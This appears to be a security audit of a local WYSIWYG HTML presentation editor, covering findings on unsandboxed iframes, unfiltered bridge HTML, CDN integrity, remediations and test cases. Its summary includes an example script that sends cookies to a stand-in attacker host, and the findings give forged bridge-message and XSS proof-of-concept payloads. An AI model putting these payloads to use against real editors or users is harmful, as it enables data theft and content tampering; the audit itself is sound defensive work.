# AUDIT-D — Security audit (v0.25.0)

**Auditor:** Audit-D (Security specialist)
**Date:** 2026-04-20
**Scope:** html-presentation-editor shell + bridge, threat surface for a local-only (file:// + http://localhost) WYSIWYG tool
**Baseline:** v0.25.0 (Gate-A 55/5/0)

---

## Executive summary

**Overall grade: 6.5 / 10** — acceptable for the stated deployment model (local, single-user, trusted-deck workflow). Not acceptable if the tool is ever repositioned as a public editor or SaaS.

The product is honest about its trust model: the onboarding modal literally says "Используйте этот режим только для доверенных файлов." That is the only sentence standing between a naive user and arbitrary code execution in their browser context. The iframe is **not sandboxed** by design (scripts inside the deck must run for engines like reveal.js/Shower to work), so the imported HTML runs with the full privileges of an `http://localhost:4173` origin that already has `sessionStorage`, `localStorage`, and — critically — **same-origin access to the editor shell window** via `window.parent`.

### Top 3 findings (critical surface)
1. **AUDIT-D-01 — Zero HTML sanitization on paste/open; iframe not sandboxed.** A deck with `<script>fetch('http://attacker/x?d='+parent.document.cookie)</script>` runs on load and can read the shell's `sessionStorage`/`localStorage` and trigger same-origin requests. (High)
2. **AUDIT-D-02 — `replace-node-html` / `replace-slide-html` bridge commands accept arbitrary HTML via `DOMParser` + `document.importNode`, no tag/attr allow-list.** Any shell-path that feeds user input into these messages can inject `<script>`, inline handlers, or `javascript:` URLs. Attribute filter exists *only* in `updateAttributes`, not in the HTML-replace path. (High)
3. **AUDIT-D-03 — PPTX export loads `pptxgenjs` from jsDelivr CDN without SRI or pinned version.** Supply-chain: a compromised CDN release hijacks the editor's origin. (Medium-High)

### One critical recommendation
Ship a **Trust Banner + single escape hatch**: when any `<script>` / `on*` / `javascript:` / remote `<iframe>` is detected in the imported document, surface a visible warning bar ("This deck contains executable code. Scripts will run.") with a one-click "Neutralize scripts" action that strips them and re-runs the import pipeline. This preserves the file:// feature while giving the user informed consent. It is a ~80-line change centered on `import.js::buildModelDocument` and the restore-banner UI.

---

## Threat model

### Assets
- **A1** — User's HTML deck (may contain proprietary business content, customer data, internal screenshots in data-URIs)
- **A2** — `sessionStorage["presentation-editor:autosave:v3"]` — full serialized project, per-tab
- **A3** — `localStorage` keys (theme, UI complexity, selection mode, zoom, inspector sections, copied-style JSON)
- **A4** — OS clipboard (read via paste events when focus is in the editor)
- **A5** — File-system handles when the user picks an asset directory (object URLs for pasted files)
- **A6** — The editor origin itself (cookies are not used, but same-origin XHR/fetch to any intranet service the user can reach would be possible from within the iframe)

### Threats (STRIDE-lite)
- **T1 (Tampering/Elevation)** — Malicious HTML paste executes arbitrary JS in iframe; via `window.parent` reaches shell because both are same-origin on file:// or localhost.
- **T2 (Spoofing)** — A second tab posts `postMessage` to the editor; or another iframe injected by the deck posts as the bridge.
- **T3 (Information disclosure)** — Deck script exfiltrates clipboard, `sessionStorage`, local asset object-URLs, or performs intranet reconnaissance (http://192.168.x.x, http://router.local).
- **T4 (Denial of service)** — Giant HTML (>5 MB) pushed into `sessionStorage` autosave → quota-exceeded; deep DOM → DOMParser pathological runtime.
- **T5 (Supply chain)** — CDN-served `pptxgenjs` is modified; starter-deck fetch path hijacked via a stale service worker (none today, but worth noting).
- **T6 (Social engineering)** — Attacker distributes a `.html` deck styled like a legitimate vendor template; user opens it trusting the warning "только для доверенных файлов."

### Out of scope
- Browser 0-days, OS-level privilege escalation, physical access.
- The single runtime dev-dependency `@playwright/test` (dev-only, not shipped).
- Attacks requiring the user to paste `javascript:` into the Base-URL field manually (that field is already validated to `http:/https:` in `normalizeManualBaseUrl`).

---

## Findings register

| ID | Title | Severity | CVSS-like | Status | File:line |
|----|-------|----------|-----------|--------|-----------|
| AUDIT-D-01 | No sanitization on HTML import; unsandboxed iframe | **High** | AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L | Accepted-by-design | `editor/src/import.js:531–535` ; `editor/src/import.js:97` |
| AUDIT-D-02 | `replace-node-html` / `replace-slide-html` accept arbitrary HTML | **High** | AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N | Open | `editor/src/bridge-script.js:2332–2339, 3374–3401` |
| AUDIT-D-03 | Unpinned CDN load of pptxgenjs without SRI | Medium | AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:L | Open | `editor/src/export.js:271–275` |
| AUDIT-D-04 | `postMessage` sent with wildcard targetOrigin `'*'` | Medium | AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N | Open | `editor/src/bridge-script.js:93` |
| AUDIT-D-05 | `sessionStorage` autosave has no size cap → quota exhaustion | Medium | AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:H | Open | `editor/src/primary-action.js:647–669` |
| AUDIT-D-06 | `localStorage` `COPIED_STYLE_KEY` parsed with `JSON.parse` without schema validation | Low-Medium | AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N | Open | `editor/src/boot.js:122` |
| AUDIT-D-07 | `setPreviewFrame.src = state.previewUrl` after `removeAttribute("sandbox")` | Medium | AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L | Accepted-by-design | `editor/src/import.js:97` |
| AUDIT-D-08 | Drag-drop accepts arbitrary image files → data-URI bloat | Low | AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L | Open | `editor/src/clipboard.js:47–58` |
| AUDIT-D-09 | Restore-banner JSON parsed without shape validation | Low | AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:L | Open | `editor/src/clipboard.js:92–105` |
| AUDIT-D-10 | No CSP meta; inline boot script in shell HTML | Informational | — | Accepted-by-design | `editor/presentation-editor.html:8–35` |
| AUDIT-D-11 | `innerHTML` sinks in shell use manual `escapeHtml` (partial coverage) | Low | AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N | Review | `editor/src/boot.js:1687` ; `editor/src/onboarding.js:62,76,92` |
| AUDIT-D-12 | `toolbar.js:85` — `escapeHtml(heading.textContent)` safe, but pattern fragile | Informational | — | Review | `editor/src/toolbar.js:85` |
| AUDIT-D-13 | Static dev server allows directory traversal guard that lowercases paths | Informational | — | Review | `scripts/static-server.js:38–46` |
| AUDIT-D-14 | `manualBaseUrl` — already whitelist-protected to http(s) — noted as good | Positive | — | — | `editor/src/slides.js:316–318` |
| AUDIT-D-15 | Bridge token scheme (`Math.random` based, not crypto) | Low | AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N | Open | `editor/src/import.js:735–737` |

---

### AUDIT-D-01 — No sanitization on HTML import; unsandboxed iframe

- **Severity:** High (within the stated local-only trust model; reclassifies to Critical if the tool is ever exposed beyond a single trusted user).
- **CVSS-like vector:** `AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L` — low attack complexity, requires user to paste/open a crafted deck, scope change to shell window.
- **Location:** `editor/src/import.js:531–535` (`buildModelDocument`), `editor/src/import.js:97` (`els.previewFrame.removeAttribute("sandbox")`)
- **Description:** `buildModelDocument()` runs `new DOMParser().parseFromString(htmlString, "text/html")` and then `runUnifiedImportPipeline()` — which only *annotates* elements with editor markers, never removing `<script>`, `<iframe>`, inline `on*` handlers, `javascript:` hrefs, SVG `<use href="http://…">`, or `<meta http-equiv="refresh">`. The resulting HTML is serialized into a Blob, loaded into the preview iframe, and — crucially — the shell explicitly calls `removeAttribute("sandbox")` on the iframe right before setting `src`. Scripts inside run with the same origin as the editor shell; `window.parent` is reachable and same-origin.
- **Impact:** A hostile deck gains:
  - Read access to `sessionStorage` → full autosaved project of any OTHER deck open in the same tab (edge case, since autosave is keyed per-tab).
  - Read access to `localStorage` → theme, UI state (low value) plus `COPIED_STYLE_KEY` which can contain arbitrary JSON.
  - Ability to `parent.postMessage({__presentationEditor:true, token:'guessed', type:'replace-slide-html', payload:{…}})` — but blocked by token check. More importantly, the deck can read `parent.state.bridgeToken` directly because same-origin, then send any bridge message it wants, including `replace-node-html` with XSS payloads for later export.
  - Intranet-port scan / SSRF-from-browser against any reachable http:// service.
  - `navigator.clipboard.read()` if the user has granted clipboard permission.
- **PoC (conceptual, non-weaponizable):** Paste HTML containing `<section class="slide"><script>top.postMessage({probe:Object.keys(parent)},'*')</script></section>`. Observe shell diagnostics pick up bridge-foreign message, confirming same-origin reach. A real attacker would instead read `parent.state.bridgeToken` and forge mutations.
- **Remediation:**
  1. **Opt-in strict mode (recommended minimum).** Add a "Neutralize scripts" toggle in the Open-HTML modal that, when enabled, runs a stripping pass in `buildModelDocument`: remove `script`, `iframe` to remote, `object`, `embed`, `meta[http-equiv]`, all `on*` attributes, `href/src` starting with `javascript:`/`data:text/html`, `<use xlink:href>` pointing off-origin.
  2. **Detection banner (Top-3 recommendation above).** Even without stripping, surface a warning row listing what was detected.
  3. **Iframe hardening for view-only mode.** When user clicks "Preview" (not "Edit"), load with `sandbox="allow-same-origin allow-scripts"` and evaluate whether deck-engine JS still works; if not, fall back to no-sandbox + banner.
  4. **Long-term:** investigate cross-origin preview via `sandbox="allow-scripts"` + a stub `<base>` whose origin is different — this isolates `window.parent` access entirely.
- **OWASP:** A03:2021 Injection, A05:2021 Security Misconfiguration. **CWE-79, CWE-1021.**

---

### AUDIT-D-02 — Bridge `replace-node-html` / `replace-slide-html` trust caller-supplied HTML

- **Severity:** High (if reachable from deck code, which it is per AUDIT-D-01).
- **CVSS-like vector:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
- **Location:** `editor/src/bridge-script.js:2332–2339` (`parseSingleRoot`), `3374–3401` (switch handlers). Also `bridge-script.js:2881` for `insertElement`.
- **Description:** The bridge defines `parseSingleRoot(html)` which wraps caller HTML in `<body>` tags, parses with `DOMParser`, and imports the single root node. **No allow-list, no script stripping, no attribute filter.** By contrast `updateAttributes` (line 2756–2796) does filter via `BLOCKED_ATTR_NAMES` + `UNSAFE_ATTR_NAME = /^on/i` — so the defense exists but is inconsistently applied. A caller who supplies `<div onerror="..."><script>…</script></div>` via `replace-node-html` gets it inlined. Because of AUDIT-D-01 the "caller" can be the deck's own runtime code.
- **Impact:** Bypasses the attribute-filter invariant; persistent XSS that survives into exported HTML — meaning a single paste can poison every future export from that session. High integrity impact.
- **PoC:** A deck runs `parent.postMessage({__presentationEditor:true, token:parent.state.bridgeToken, type:'replace-node-html', payload:{nodeId:'<first node id>', html:'<p onerror=alert(1)>'}}, '*')`. Because token is readable same-origin, the shell's `bindMessages` passes the check and forwards; the iframe side re-receives and writes via `current.replaceWith(replacement)`.
- **Remediation:**
  1. Apply the same attribute filter inside `parseSingleRoot`: walk the fragment, drop `script`, `iframe[src^="http"]`, `on*` attrs, `href^="javascript:"`, `srcdoc`.
  2. Consider a strict mode where `replace-node-html` rejects any HTML containing tag names outside a deck-appropriate set (`div,span,p,h1-6,ul,ol,li,img,table,tr,td,th,figure,figcaption,em,strong,a,code,pre,br,svg`).
  3. Length cap: reject `html` payload > 256 KB.
- **OWASP:** A03:2021 Injection. **CWE-79, CWE-80, CWE-116.**

---

### AUDIT-D-03 — Unpinned CDN load of pptxgenjs

- **Severity:** Medium.
- **CVSS-like vector:** `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:L`
- **Location:** `editor/src/export.js:271–275`. URL is `https://cdn.jsdelivr.net/npm/pptxgenjs/dist/pptxgen.bundled.js` — **no version pin, no Subresource Integrity hash.**
- **Description:** A user who clicks "Export PPTX" triggers a GET to the latest jsdelivr build. Any future npm-registry or jsDelivr compromise yields arbitrary JS executing in the shell origin with full access to the model, `sessionStorage`, and the ability to modify the exported PPTX (including embedding tracker URLs or payloads into Office files users will then share).
- **Impact:** Supply-chain compromise. Also a privacy leak: every export tells jsDelivr someone is using this editor.
- **Remediation:**
  1. Pin the exact version: `pptxgenjs@3.12.0/dist/pptxgen.bundled.js` (or whatever is known-good).
  2. Add `integrity="sha384-…"` and `crossorigin="anonymous"`.
  3. Better: vendor the file into `editor/vendor/pptxgenjs.min.js` (yes, this adds ~700 KB, but it is consistent with "zero dependencies runtime" and eliminates the risk).
  4. Document the decision in an ADR (ADR-008 candidate).
- **OWASP:** A06:2021 Vulnerable and Outdated Components, A08:2021 Software and Data Integrity Failures. **CWE-829, CWE-494.**

---

### AUDIT-D-04 — `postMessage` target origin is `'*'`

- **Severity:** Medium.
- **Location:** `editor/src/bridge-script.js:93` — `parent.postMessage({…}, '*')`. The shell side also does not pin origin when sending (see `bridge-commands.js:79–83`).
- **Description:** Using `'*'` as targetOrigin is fine when shell and iframe are both file:// or both same-origin localhost — the message is delivered only to the parent. **However**, the `event.origin` is not checked on either end; the shell only filters by `event.source === iframe.contentWindow` and the token. This is defense-in-depth good, but the origin check is the traditional belt.
- **Impact:** Low in practice. Could matter if the editor ever gets embedded in a third-party page (unlikely per product model).
- **Remediation:**
  1. On both sides, compute expected origin from `window.location.origin` and pass it to `postMessage` instead of `'*'`.
  2. On receive, add `event.origin === window.location.origin` as a first-line filter before the token check.
- **OWASP:** A04:2021 Insecure Design. **CWE-346 Origin Validation Error.**

---

### AUDIT-D-05 — Autosave has no size cap → sessionStorage quota DoS

- **Severity:** Medium.
- **Location:** `editor/src/primary-action.js:647–669` (`saveProjectToLocalStorage`).
- **Description:** The serialized project HTML is written to `sessionStorage` without size check. Browsers cap sessionStorage at ~5–10 MB. A deck containing a few 1080p base64 images already approaches this. `try/catch` logs to diagnostics but the user never sees why the save silently fails, and subsequent saves keep failing.
- **Impact:** Availability of the autosave feature; silent data loss on restore.
- **Remediation:**
  1. Estimate `payload.html.length` and warn above ~3 MB, skip above ~6 MB with a clear toast.
  2. Consider `IndexedDB` for decks containing base64 media (order of magnitude more capacity).
- **OWASP:** A04:2021 Insecure Design. **CWE-770 Allocation of Resources Without Limits.**

---

### AUDIT-D-06 — `COPIED_STYLE_KEY` parsed without schema validation

- **Severity:** Low-Medium.
- **Location:** `editor/src/boot.js:122` — `JSON.parse(localStorage.getItem(COPIED_STYLE_KEY))`.
- **Description:** `localStorage` is writable by any script sharing the origin; that includes the pasted deck (AUDIT-D-01). A malicious deck can inject `{"backgroundImage":"url(javascript:…)","__proto__":{"polluted":true}}`. Modern engines mitigate prototype pollution on literal object parse, but the style-copy path subsequently spreads values into element.style, so a `javascript:` URL inside `background-image` could be applied to an exported element — persistence into export.
- **Impact:** Stored-XSS-via-style if spread naively. Low because `el.style.backgroundImage = "url(javascript:…)"` is blocked by modern browsers, but defense-in-depth required.
- **Remediation:**
  1. Reject values containing `javascript:` or `expression(` substrings.
  2. Apply a property allow-list (font-family, color, background-color, padding, margin, …) when restoring.
  3. Wrap `JSON.parse` in a defensive `Object.create(null)`-based merge.
- **OWASP:** A03:2021 Injection; A08:2021 Integrity. **CWE-915, CWE-1321.**

---

### AUDIT-D-07 — Explicit `removeAttribute("sandbox")` in `import.js:97`

- **Severity:** Medium (this is the mechanical root cause of AUDIT-D-01; tracked separately as a remediation lever).
- **Location:** `editor/src/import.js:97`.
- **Description:** The preview iframe has no sandbox at HTML-template level (grep of shell HTML found zero `sandbox` attributes), and import explicitly clears any leftover. The code comment makes no mention of sandbox intent. A future maintainer wishing to harden the iframe would not find a guardrail.
- **Remediation:**
  1. Add an inline comment tying this to the conscious trust decision.
  2. Introduce a `SANDBOX_MODE` state flag ("off" / "scripts-only" / "full") and respect it in both preview.js and import.js; default "off" for parity, but make it flippable.
- **OWASP:** A05:2021 Security Misconfiguration.

---

### AUDIT-D-08 — Drag-drop accepts any image file → memory/data URL bloat

- **Severity:** Low.
- **Location:** `editor/src/clipboard.js:47–58`, `editor/src/dom.js:350–356`.
- **Description:** `fileToDataUrl(file)` is called on any dropped file whose MIME starts with `image/`. No size cap. A user accidentally dropping a 50 MB RAW/PSD with `image/*` MIME inflates the model by ~67 MB base64, which triggers AUDIT-D-05.
- **Remediation:** Cap at e.g. 8 MB per image; offer asset-directory path for larger files.

---

### AUDIT-D-09 — Restore banner trusts payload shape

- **Severity:** Low.
- **Location:** `editor/src/clipboard.js:64–90`, `92–105`.
- **Description:** `tryRestoreDraftPrompt()` does `JSON.parse` and checks `payload.html`, then passes `payload.manualBaseUrl`, `payload.sourceLabel`, `payload.mode`, `payload.activeSlideIndex` into the load pipeline. `normalizeEditorMode` exists, `normalizeManualBaseUrl` exists — good. But `sourceLabel` becomes a toast string; `activeSlideIndex` is passed to Number. A same-origin writer (malicious paste) could poison sessionStorage so the next restore loads a different deck's HTML silently, confusing the user as to which file is open. This blends with AUDIT-D-01.
- **Remediation:** Add a signed-checksum field on autosave (HMAC over key material derived from the bridge token at save time, stored separately). Not cryptographic-grade, but detects overwrite.

---

### AUDIT-D-10 — No CSP, inline theme-boot script

- **Severity:** Informational.
- **Location:** `editor/presentation-editor.html:8–35`.
- **Description:** No `<meta http-equiv="Content-Security-Policy">`. Inline script is used for early theme boot (acceptable). The 24 non-module `<script src="…">` tags are all same-origin relative paths.
- **Remediation (for http://localhost mode):** See CSP template below.
- **OWASP:** A05:2021. **CWE-693.**

---

### AUDIT-D-11 — `innerHTML` sinks in shell

- **Severity:** Low.
- **Location:** 22 call sites; reviewed the non-trivial ones (`boot.js:1687,1691,1695,1700`, `onboarding.js:62,76,92`, `selection.js:1479`, `feedback.js:22`, `toolbar.js:85`, `context-menu.js:439`).
- **Description:** All reviewed sites use `escapeHtml()` on externally-derived text, OR the input is static Russian copy authored at build time. `selection.js:1479` is safe (nodeId comes from editor attributes already filtered). `boot.js:1691` escapes `state.assetResolverLabel`. `feedback.js:22` escapes title, message, and `options.actionLabel`. **The pattern is defensible but brittle**: a future copy-paste of the same template without `escapeHtml` would introduce XSS.
- **Remediation:**
  1. Introduce a tiny `html` tagged-template helper that escapes interpolations by default (15 lines). Retrofit the highest-risk sites first.
  2. Consider a lint rule forbidding `.innerHTML =` in favor of the helper.
- **OWASP:** A03:2021. **CWE-79.**

---

### AUDIT-D-12 — `toolbar.js:85` innerHTML pattern

- **Severity:** Informational. The `heading.textContent` source is inspector-authored, `escapeHtml` is applied. Safe today. Flagged only to include in the same sweep as AUDIT-D-11.

---

### AUDIT-D-13 — `static-server.js` directory-traversal guard lowercases paths

- **Severity:** Informational.
- **Location:** `scripts/static-server.js:38–46`.
- **Description:** `filePath.toLowerCase() !== rootDir.toLowerCase()` allows case-only differences from `rootDir`. On Windows (case-insensitive FS) this is benign; on Linux CI (case-sensitive) it widens the allowed root slightly. No concrete escape path identified, but the guard is non-standard.
- **Remediation:** Use `path.relative(rootDir, filePath).startsWith('..')` as the canonical test; remove the lowercase comparison.

---

### AUDIT-D-14 — Base URL validator (positive finding)

- **Severity:** Positive.
- **Location:** `editor/src/slides.js:316–318`.
- **Description:** `normalizeManualBaseUrl` correctly rejects any protocol not in `["http:", "https:"]`, closing `javascript:`, `file:`, `data:` injection via the Base-URL input. Good.

---

### AUDIT-D-15 — Bridge token is `Math.random`-based

- **Severity:** Low.
- **Location:** `editor/src/import.js:735–737`.
- **Description:** `Math.random().toString(36).slice(2) + '-' + Date.now()` gives ~52 bits of entropy. Sufficient against cross-iframe guessing but not cryptographic. Per AUDIT-D-01, a same-origin attacker reads the token from `parent.state.bridgeToken` directly, so hardening entropy doesn't help that threat.
- **Remediation:** Replace with `crypto.getRandomValues(new Uint8Array(16))` → hex. Zero runtime cost; aligns with best practice.
- **OWASP:** A02:2021 Cryptographic Failures (weak). **CWE-338.**

---

## Defense-in-depth recommendations (prioritized)

### P1 — Must-ship if trust model ever widens
1. Add HTML neutralization toggle and detection banner (AUDIT-D-01).
2. Apply attribute filter inside `parseSingleRoot` / all HTML-accepting bridge commands (AUDIT-D-02).
3. Pin + SRI-hash or vendor pptxgenjs (AUDIT-D-03).

### P2 — Low-cost hardening, ship soon
4. Replace `Math.random` bridge token with `crypto.getRandomValues` (AUDIT-D-15).
5. Pin `postMessage` targetOrigin to `window.location.origin` and add `event.origin` check (AUDIT-D-04).
6. Size-cap autosave and per-image drops (AUDIT-D-05, AUDIT-D-08).
7. Schema-validate restored autosave payload (AUDIT-D-09).

### P3 — Hygiene and future-proofing
8. Introduce `html` tagged-template helper; retrofit `innerHTML` sites (AUDIT-D-11).
9. Write ADR-008 documenting the trust model explicitly: "Editor runs imported decks as code; user-facing warnings are mandatory."
10. Replace lowercase path guard in static server (AUDIT-D-13).
11. Consider moving deck autosave to IndexedDB.

### P4 — Monitoring
12. Surface a diagnostic counter: number of `<script>`/`on*`/`javascript:` tokens detected in the last imported deck. Non-blocking, visible in the diagnostics drawer.

---

## CSP / headers template (for `http://localhost` serve mode)

Add to `scripts/static-server.js` when serving `/editor/presentation-editor.html`:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;  /* inline-needed for theme-boot + bridge script; remove unsafe-inline once theme-boot is externalized */
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: blob:;
  media-src 'self' blob:;
  font-src 'self' data:;
  connect-src 'self' https://cdn.jsdelivr.net;
  frame-src 'self' blob:;
  worker-src 'self' blob:;
  object-src 'none';
  base-uri 'self';
  form-action 'none';
  frame-ancestors 'none';
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Permissions-Policy: clipboard-read=(self), clipboard-write=(self), camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

Caveats:
- The `blob:` allowance on `frame-src`/`media-src` is essential — preview iframes are loaded from `URL.createObjectURL(Blob)`.
- `'unsafe-inline'` for scripts is temporarily required by `editor/presentation-editor.html:8-35` theme-boot. Once that is moved to an external file, drop the directive and it becomes a meaningful XSS guard.
- CSP is **not applicable under file://** — all directives are ignored by browsers in that mode. For file:// deployments the only trust boundary is user discipline + AUDIT-D-01 remediations.

---

## Security test cases (for Gate-A extension)

1. **Paste `<script>parent.postMessage({a:1},'*')</script>` deck** — shell diagnostics must show `iframe-error` or the message rejected by token check; no `fetch` to non-existent URL; no `alert`.
2. **Paste deck with `<img src=x onerror=1>`** — on export, `onerror` must be stripped (or preserved if by-design) with clear indication.
3. **Send `replace-node-html` with `<p onclick=x>`** — after remediation of AUDIT-D-02, attribute must be absent on committed DOM.
4. **sessionStorage write of 9.9 MB payload** — autosave must fail gracefully with user-visible toast, not silent.
5. **`manualBaseUrl = javascript:alert(1)`** — input rejected, toast shown. (already passes.)
6. **Dropped 50 MB "image"** — rejected with size-limit toast (pending AUDIT-D-08).
7. **`localStorage.setItem("presentation-editor:copied-style:v1", "{\"backgroundImage\":\"url(javascript:x)\"}")` then paste style** — `javascript:` blocked on apply.
8. **Autosave payload tampered: `{html:"…",mode:"<script>"}` via DevTools** — restore banner still loads safely, mode normalized to `preview`/`edit`.
9. **Import 50-level-deep `<div>` nesting** — DOMParser completes within 2 s, or import aborts with `parse-error`.

---

## References

### OWASP Top 10 (2021) — relevant items
- **A01 Broken Access Control** — N/A (no auth model).
- **A02 Cryptographic Failures** — AUDIT-D-15 (weak token).
- **A03 Injection** — AUDIT-D-01, 02, 06, 11. Primary risk surface.
- **A04 Insecure Design** — AUDIT-D-04, 05. The "run arbitrary deck HTML" contract is an intentional design decision; documenting it is the mitigation.
- **A05 Security Misconfiguration** — AUDIT-D-07, 10.
- **A06 Vulnerable / Outdated Components** — AUDIT-D-03.
- **A07 Identification and Authentication Failures** — N/A.
- **A08 Software and Data Integrity Failures** — AUDIT-D-03, 06, 09.
- **A09 Security Logging and Monitoring Failures** — partial; `addDiagnostic` captures runtime errors, but no structured security events.
- **A10 Server-Side Request Forgery** — only via AUDIT-D-01 (deck scripts making intranet requests in user's browser). Browser-side SSRF-equivalent.

### CWE references
- CWE-79 Cross-site Scripting — AUDIT-D-01, 02, 11.
- CWE-80 Improper Neutralization of Script-Related HTML Tags — AUDIT-D-02.
- CWE-116 Improper Encoding or Escaping of Output — AUDIT-D-02, 11.
- CWE-338 Weak PRNG — AUDIT-D-15.
- CWE-346 Origin Validation Error — AUDIT-D-04.
- CWE-494 Download of Code Without Integrity Check — AUDIT-D-03.
- CWE-770 Allocation of Resources Without Limits — AUDIT-D-05, 08.
- CWE-829 Inclusion of Functionality from Untrusted Control Sphere — AUDIT-D-03.
- CWE-915 Improperly Controlled Modification of Dynamically-Determined Object Attributes — AUDIT-D-06.
- CWE-1021 Improper Restriction of Rendered UI Layers (iframe) — AUDIT-D-01.
- CWE-1321 Improperly Controlled Modification of Object Prototype — AUDIT-D-06.

### Additional reading
- OWASP HTML Sanitizer Cheatsheet (DOMPurify is the reference implementation; ~18 KB gzipped, would fit the "zero build step" constraint as a vendored single file).
- W3C CSP3 — frame-src + blob: compatibility matrix.
- WICG Sanitizer API (native `Element.setHTML`) — still experimental in 2026, worth tracking.

---

## Final posture statement

Within the explicit "local, single-user, trusted-file" threat model, the editor is defensible — the risk is transferred to the user's judgment about which files to open, and the UI does surface a warning. The codebase shows security awareness in specific places (attribute filter in `updateAttributes`, Base-URL protocol whitelist, bridge token+origin check on receive, per-tab sessionStorage isolation). The gaps are in consistency: the same filtering needs to apply in `parseSingleRoot`, the CDN load needs SRI, the trust decision needs a written ADR, and the user-visible "trust this file" moment deserves more than one sentence in a modal.

If the editor ever ships beyond local-single-user (hosted SaaS, shared teamspace, browser-extension), AUDIT-D-01 through 03 become release-blocking and a full sanitizer library (DOMPurify or the native Sanitizer API) must be adopted before that shift.
